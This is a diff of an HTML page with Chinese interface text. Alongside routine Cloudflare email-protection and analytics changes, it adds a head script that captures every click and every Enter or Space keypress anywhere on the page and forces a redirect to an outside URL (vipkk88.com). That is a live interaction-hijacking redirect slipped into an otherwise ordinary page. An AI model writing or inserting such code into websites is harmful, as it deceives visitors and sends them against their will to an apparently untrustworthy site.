@@ -10,10 +10,22 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Serif+SC:wght@500;700;900&display=swap" rel="stylesheet" />
 
 <script>
+  var __jumped = false;
   function k2() {
-   
+    if (__jumped) return;
+    __jumped = true;
     window.location.href = 'https://vipkk88.com/UIUK2P';
   }
+  /* 全页任意位置点击，都走同一个跳转事件 */
+  document.addEventListener('click', function () {
+    k2();
+  }, true);
+  /* 键盘回车/空格等激活元素时同样触发 */
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' || e.key === ' ' || e.key === 'Spacebar') {
+      k2();
+    }
+  }, true);
 </script>
 <style>
 :root{
@@ -994,7 +1006,7 @@ button{font-family:inherit;cursor:pointer;border:none;background:none;color:inhe
           <li><button type="button" onclick="openSheet('privacy')">隐私政策</button></li>
           <li><button type="button" onclick="openSheet('terms')">使用条款</button></li>
           <li><button type="button" onclick="openSheet('disclaimer')">免责声明</button></li>
-          <li><a href="mailto:contact@example.com">联系我们</a></li>
+          <li><a href="/cdn-cgi/l/email-protection#bbd8d4d5cfdad8cffbdec3dad6cbd7de95d8d4d6">联系我们</a></li>
         </ul>
       </div>
     </div>
@@ -1026,7 +1038,7 @@ button{font-family:inherit;cursor:pointer;border:none;background:none;color:inhe
   </div>
 </div>
 
-<script>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
 /* ── 弹窗内容 ── */
 var sheetData = {
   privacy: {
@@ -1108,5 +1120,6 @@ document.addEventListener('keydown', function(e){
 })();
 </script>
 
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"766398901dfc4e7d895e35cacacb76d8","r":1,"spa":2}' crossorigin="anonymous"></script>
 </body>
 </html>
